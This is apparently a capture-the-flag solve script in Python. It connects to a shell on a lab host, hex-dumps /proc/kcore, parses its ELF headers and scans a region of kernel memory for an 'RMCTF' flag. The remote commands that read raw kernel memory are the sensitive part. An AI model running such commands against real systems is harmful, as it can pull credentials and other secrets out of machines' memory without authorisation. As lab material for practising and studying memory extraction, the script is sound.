#!/usr/bin/env python3
import binascii
import re
import socket
import struct


HOST = "10.42.5.10"
PORT = 1337

# Segment containing the repeated flag pages, relative to the LOAD segment
# whose file size is 0x2830000 in /proc/kcore.
FLAG_CHUNK_REL = 0x1800000
FLAG_CHUNK_LEN = 0x400000


def recv_until(sock: socket.socket, token: bytes, timeout: float) -> bytes:
    sock.settimeout(1)
    data = b""
    end = __import__("time").time() + timeout
    while __import__("time").time() < end:
        try:
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
            if token in data:
                break
        except socket.timeout:
            continue
    return data


def run_hex(sock: socket.socket, payload_cmd: str, timeout: float) -> bytes:
    cmd = (
        "stty -echo; "
        "printf '\\137\\137START\\137\\137\\n'; "
        f"{payload_cmd}; "
        "printf '\\137\\137END\\137\\137\\n'; "
        "stty echo\n"
    )
    sock.sendall(cmd.encode())
    raw = recv_until(sock, b"__END__", timeout).decode("utf-8", "replace")

    collecting = False
    hex_lines = []
    for line in raw.splitlines():
        line = line.strip().replace("\r", "")
        if line == "__START__":
            collecting = True
            continue
        if line.startswith("__END__"):
            break
        if collecting:
            cleaned = "".join(ch for ch in line if ch in "0123456789abcdef")
            if cleaned:
                hex_lines.append(cleaned)

    return binascii.unhexlify("".join(hex_lines))


def main() -> None:
    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        recv_until(sock, b"~ #", 25)

        header = run_hex(
            sock,
            "dd if=/proc/kcore bs=1 count=512 2>/dev/null | xxd -p",
            60,
        )

        phoff = struct.unpack_from("<Q", header, 32)[0]
        phentsz = struct.unpack_from("<H", header, 54)[0]
        phnum = struct.unpack_from("<H", header, 56)[0]

        seg_off = None
        for i in range(phnum):
            off = phoff + i * phentsz
            p_type, _, p_offset, _, _, p_filesz, _, _ = struct.unpack_from(
                "<IIQQQQQQ", header, off
            )
            if p_type == 1 and p_filesz == 0x2830000:
                seg_off = p_offset
                break

        if seg_off is None:
            raise RuntimeError("target LOAD segment not found")

        chunk = run_hex(
            sock,
            f"xxd -p -s {seg_off + FLAG_CHUNK_REL} -l {FLAG_CHUNK_LEN} /proc/kcore",
            900,
        )

    candidates = sorted(set(re.findall(rb"RMCTF\{[^}]+\}", chunk)))
    if not candidates:
        raise RuntimeError("flag not found in extracted chunk")

    print(candidates[0].decode())


if __name__ == "__main__":
    main()
